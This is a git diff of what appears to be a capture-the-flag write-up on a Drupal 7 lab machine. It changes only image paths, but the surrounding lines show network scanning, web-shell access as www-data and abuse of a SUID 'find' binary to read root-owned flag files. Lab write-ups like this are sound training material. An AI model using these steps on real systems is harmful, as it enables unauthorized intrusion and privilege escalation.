@@ -27,7 +27,7 @@ sudo arp-scan -l
 
 Discovered target machine on the lab subnet — IP `192.168.147.XXX`.
 
-![Network Discovery](assets/arp_scan.png)
+![Network Discovery](arp-scan.png)
 
 ### Port and Service Scanning
 
@@ -43,7 +43,7 @@ nmap -T4 -sC -sV -O -A --script http-enum 192.168.147.XXX
 
 The `http-enum` script detected characteristic Drupal files (`/INSTALL.txt`, `/UPGRADE.txt`, `/CHANGELOG.txt`, `/README.txt`) — web application identified as **Drupal 7**.
 
-![Nmap Scan](assets/nmap_scan.png)
+![Nmap Scan](nmap.png)
 
 ---
 
@@ -73,7 +73,7 @@ Access confirmed via web shell:
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-![Exploit Execution](assets/exploit.png)
+![Exploit Execution](exploit.png)
 
 ---
 
@@ -99,7 +99,7 @@ find / -perm -4000 -type f
 
 The list revealed a non-standard SUID bit on `/usr/bin/find` (`-rwsr-xr-x`) — a known privilege escalation vector (see GTFOBins).
 
-![SUID Discovery](assets/suid_find.png)
+![SUID Discovery](suid_find.png)
 
 ### SUID find Exploitation
 
@@ -118,8 +118,8 @@ find / -name "flag*.txt" -exec echo "=== {} ===" \; -exec /bin/cat {} \;
 
 Since `find` runs with effective UID 0, traversal of the `/root` directory and reading `thefinalflag.txt` succeeds, even though `www-data` has no direct access to this directory. This confirms full system compromise.
 
-![Root Verification](assets/root_whoami.png)
-![Flags](assets/flag4.png)
+![Root Verification](root_whoami.png)
+![Flags](flag4.png)
 
 ---
 
